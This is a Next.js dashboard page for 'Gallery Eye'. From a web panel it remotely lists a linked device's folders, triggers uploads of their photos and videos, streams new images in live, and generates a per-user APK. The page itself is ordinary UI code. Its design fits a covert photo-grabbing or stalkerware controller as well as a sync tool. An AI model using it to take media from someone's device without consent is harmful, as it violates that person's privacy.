"use client";

import { useState, useEffect } from 'react';
import { useSession } from 'next-auth/react';
import { useRouter } from 'next/navigation';
import io from 'socket.io-client';
import AppGenerationModal from '../../components/AppGenerationModal';

let socket: any;

interface FileItem {
    id: string;
    url: string;
    created_at: string;
    resource_type: 'image' | 'video';
    format?: string;
}

interface Folder {
    name: string;
    count: number;
}

export default function Dashboard() {
    const { data: session, status } = useSession();
    const router = useRouter();

    // State
    const [files, setFiles] = useState<FileItem[]>([]);
    const [folders, setFolders] = useState<Folder[]>([]);
    const [activeTab, setActiveTab] = useState('images'); // 'images' or 'videos'
    const [selectedFiles, setSelectedFiles] = useState<Set<string>>(new Set());
    const [modalFile, setModalFile] = useState<FileItem | null>(null);
    const [isDownloading, setIsDownloading] = useState(false);
    const [isOnline, setIsOnline] = useState(false);
    const [showApkModal, setShowApkModal] = useState(false);
    const [isSidebarOpen, setIsSidebarOpen] = useState(false); // Mobile sidebar

    useEffect(() => {
        if (status === 'unauthenticated') router.push('/login');
    }, [status, router]);

    useEffect(() => {
        if (session?.user?.uuid) {
            fetchFiles();

            socket = io(process.env.NEXT_PUBLIC_API_URL || 'http://localhost:3000');
            socket.emit('register_web', { uuid: session.user.uuid });

            // Socket Events
            socket.on('device_status', (data: any) => setIsOnline(data.online));
            socket.on('folder_list', (data: Folder[]) => setFolders(data));
            socket.on('new_image', (newFile: FileItem) => {
                setFiles(prev => [newFile, ...prev]);
            });

            // Request folders initially
            socket.emit('request_folders', { uuid: session.user.uuid });

            return () => socket.disconnect();
        }
    }, [session]);

    const fetchFiles = async () => {
        if (!session?.user?.uuid) return;
        try {
            const res = await fetch(`${process.env.NEXT_PUBLIC_API_URL || 'http://localhost:3000'}/images?uuid=${session.user.uuid}`);
            const data = await res.json();
            setFiles(data);
        } catch (e) {
            console.error(e);
        }
    };

    const images = files.filter(f => f.resource_type === 'image');
    const videos = files.filter(f => f.resource_type === 'video');
    const currentFiles = activeTab === 'images' ? images : videos;

    const toggleSelect = (id: string) => {
        const newSelected = new Set(selectedFiles);
        if (newSelected.has(id)) newSelected.delete(id);
        else newSelected.add(id);
        setSelectedFiles(newSelected);
    };

    const selectAll = () => {
        if (selectedFiles.size === currentFiles.length) {
            setSelectedFiles(new Set());
        } else {
            const newSelected = new Set<string>();
            currentFiles.forEach(f => newSelected.add(f.id));
            setSelectedFiles(newSelected);
        }
    };

    const downloadZip = async (filesToDownload: FileItem[]) => {
        setIsDownloading(true);
        try {
            const res = await fetch(`${process.env.NEXT_PUBLIC_API_URL || 'http://localhost:3000'}/download-zip`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    files: filesToDownload.map(f => ({
                        url: f.url,
                        filename: `${f.id}.${f.format || (f.resource_type === 'video' ? 'mp4' : 'jpg')}`
                    }))
                })
            });

            if (!res.ok) throw new Error('Download failed');

            const blob = await res.blob();
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `gallery_download_${Date.now()}.zip`;
            document.body.appendChild(a);
            a.click();
            window.URL.revokeObjectURL(url);
        } catch (e) {
            alert('Download failed');
        } finally {
            setIsDownloading(false);
        }
    };

    const triggerFolderSync = (folderName: string) => {
        if (!session?.user?.uuid) return;
        socket.emit('trigger_upload', {
            uuid: session.user.uuid,
            folderName,
            count: 5 // Default batch size
        });
        alert(`Sync started for ${folderName}`);
    };

    return (
        <div className="min-h-screen bg-black text-white flex flex-col md:flex-row">

            {/* Mobile Header */}
            <div className="md:hidden flex justify-between items-center p-4 border-b border-gray-800 bg-black sticky top-0 z-20">
                <h1 className="text-xl font-bold bg-gradient-to-r from-blue-500 to-purple-600 bg-clip-text text-transparent">
                    Gallery Eye
                </h1>
                <div className="flex items-center gap-4">
                    <div className={`w-3 h-3 rounded-full ${isOnline ? 'bg-green-500 shadow-[0_0_10px_#22c55e]' : 'bg-red-500'}`} />
                    <button onClick={() => setIsSidebarOpen(!isSidebarOpen)} className="text-white">
                        ☰
                    </button>
                </div>
            </div>

            {/* Sidebar (Folders & Actions) */}
            <aside className={`fixed md:sticky top-0 h-screen w-64 bg-gray-900 border-r border-gray-800 p-6 flex flex-col gap-6 transition-transform z-30 ${isSidebarOpen ? 'translate-x-0' : '-translate-x-full md:translate-x-0'}`}>
                <div className="hidden md:flex items-center justify-between">
                    <h1 className="text-2xl font-bold bg-gradient-to-r from-blue-500 to-purple-600 bg-clip-text text-transparent">
                        Gallery Eye
                    </h1>
                    <div className={`w-3 h-3 rounded-full ${isOnline ? 'bg-green-500 shadow-[0_0_10px_#22c55e]' : 'bg-red-500'}`} title={isOnline ? "Device Online" : "Device Offline"} />
                </div>

                <button
                    onClick={() => setShowApkModal(true)}
                    className="w-full py-3 bg-gradient-to-r from-purple-600 to-blue-600 rounded-xl font-bold hover:scale-105 transition-transform shadow-lg shadow-purple-500/20"
                >
                    Download App
                </button>

                <div className="flex-1 overflow-y-auto">
                    <h3 className="text-gray-400 text-sm font-semibold uppercase tracking-wider mb-4">Device Folders</h3>
                    {folders.length === 0 ? (
                        <p className="text-gray-600 text-sm italic">No folders detected yet.</p>
                    ) : (
                        <div className="space-y-2">
                            {folders.map((folder, idx) => (
                                <div key={idx} className="flex justify-between items-center p-3 bg-gray-800/50 rounded-lg hover:bg-gray-800 transition-colors group">
                                    <span className="text-sm truncate max-w-[120px]" title={folder.name}>{folder.name}</span>
                                    <button
                                        onClick={() => triggerFolderSync(folder.name)}
                                        className="text-xs bg-blue-500/20 text-blue-400 px-2 py-1 rounded hover:bg-blue-500 hover:text-white transition-colors"
                                    >
                                        Sync
                                    </button>
                                </div>
                            ))}
                        </div>
                    )}
                </div>

                <div className="pt-4 border-t border-gray-800">
                    <button onClick={() => router.push('/api/auth/signout')} className="text-gray-400 hover:text-white text-sm flex items-center gap-2">
                        ← Sign Out
                    </button>
                </div>
            </aside>

            {/* Main Content */}
            <main className="flex-1 p-4 md:p-8 overflow-y-auto h-screen" onClick={() => setIsSidebarOpen(false)}>
                <header className="flex flex-col md:flex-row justify-between items-start md:items-center mb-8 gap-4">
                    <div>
                        <h2 className="text-2xl font-bold">Dashboard</h2>
                        <p className="text-gray-400 text-sm">Manage your synced media</p>
                    </div>

                    <div className="flex gap-3 w-full md:w-auto">
                        <button
                            onClick={() => {
                                const toDownload = files.filter(f => selectedFiles.has(f.id));
                                if (toDownload.length) downloadZip(toDownload);
                            }}
                            disabled={selectedFiles.size === 0 || isDownloading}
                            className="flex-1 md:flex-none px-4 py-2 bg-gray-800 rounded-full hover:bg-gray-700 disabled:opacity-50 text-sm font-medium whitespace-nowrap"
                        >
                            {isDownloading ? 'Zipping...' : `Download Selected (${selectedFiles.size})`}
                        </button>
                        <button
                            onClick={() => downloadZip(files)}
                            disabled={files.length === 0 || isDownloading}
                            className="flex-1 md:flex-none px-4 py-2 bg-blue-600 rounded-full hover:bg-blue-700 disabled:opacity-50 text-sm font-medium whitespace-nowrap"
                        >
                            Download All
                        </button>
                    </div>
                </header>

                {/* Tabs */}
                <div className="flex gap-4 mb-6 border-b border-gray-800 pb-4 overflow-x-auto">
                    <button
                        onClick={() => setActiveTab('images')}
                        className={`px-4 py-2 rounded-lg transition-colors whitespace-nowrap ${activeTab === 'images' ? 'bg-white text-black' : 'text-gray-400 hover:text-white'}`}
                    >
                        Images ({images.length})
                    </button>
                    {videos.length > 0 && (
                        <button
                            onClick={() => setActiveTab('videos')}
                            className={`px-4 py-2 rounded-lg transition-colors whitespace-nowrap ${activeTab === 'videos' ? 'bg-white text-black' : 'text-gray-400 hover:text-white'}`}
                        >
                            Videos ({videos.length})
                        </button>
                    )}
                    <button onClick={selectAll} className="ml-auto text-sm text-gray-400 hover:text-white whitespace-nowrap">
                        {selectedFiles.size === currentFiles.length ? 'Deselect All' : 'Select All'}
                    </button>
                </div>

                {/* Grid */}
                <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 xl:grid-cols-5 gap-4 pb-20">
                    {currentFiles.map(file => (
                        <div key={file.id} className="relative group aspect-square bg-gray-900 rounded-xl overflow-hidden cursor-pointer shadow-lg hover:shadow-xl transition-all">
                            {file.resource_type === 'video' ? (
                                <video src={file.url} className="w-full h-full object-cover opacity-90 group-hover:opacity-100 transition-opacity" />
                            ) : (
                                <img src={file.url} alt="" className="w-full h-full object-cover opacity-90 group-hover:opacity-100 transition-opacity" />
                            )}

                            {/* Overlay */}
                            <div className="absolute inset-0 bg-black/40 opacity-0 group-hover:opacity-100 transition-opacity flex items-center justify-center gap-3">
                                <button
                                    onClick={(e) => { e.stopPropagation(); setModalFile(file); }}
                                    className="p-3 bg-white/20 rounded-full hover:bg-white/40 backdrop-blur-md transition-transform hover:scale-110"
                                >
                                    👁️
                                </button>
                                <button
                                    onClick={(e) => { e.stopPropagation(); toggleSelect(file.id); }}
                                    className={`p-3 rounded-full backdrop-blur-md transition-transform hover:scale-110 ${selectedFiles.has(file.id) ? 'bg-blue-500 text-white' : 'bg-white/20 hover:bg-white/40'}`}
                                >
                                    {selectedFiles.has(file.id) ? '✓' : '+'}
                                </button>
                            </div>

                            {/* Video Indicator */}
                            {file.resource_type === 'video' && (
                                <div className="absolute top-2 right-2 px-2 py-1 bg-black/60 backdrop-blur-sm rounded text-xs font-bold">▶ VIDEO</div>
                            )}
                        </div>
                    ))}
                </div>
            </main>

            {/* Modals */}
            {modalFile && (
                <div className="fixed inset-0 z-50 bg-black/95 flex items-center justify-center p-4" onClick={() => setModalFile(null)}>
                    <div className="max-w-6xl w-full max-h-[90vh] relative flex flex-col items-center" onClick={e => e.stopPropagation()}>
                        {modalFile.resource_type === 'video' ? (
                            <video src={modalFile.url} controls autoPlay className="w-full h-full max-h-[80vh] object-contain rounded-lg shadow-2xl" />
                        ) : (
                            <img src={modalFile.url} alt="" className="w-full h-full max-h-[80vh] object-contain rounded-lg shadow-2xl" />
                        )}

                        <div className="mt-6 flex gap-4">
                            <a
                                href={modalFile.url}
                                download
                                target="_blank"
                                className="px-8 py-3 bg-white text-black rounded-full font-bold hover:bg-gray-200 transition-colors"
                            >
                                Download Original
                            </a>
                            <button
                                onClick={() => setModalFile(null)}
                                className="px-8 py-3 bg-gray-800 text-white rounded-full font-bold hover:bg-gray-700 transition-colors"
                            >
                                Close
                            </button>
                        </div>
                    </div>
                </div>
            )}

            <AppGenerationModal
                isOpen={showApkModal}
                onClose={() => setShowApkModal(false)}
                uuid={session?.user?.uuid || ''}
                socket={socket}
            />
        </div>
    );
}
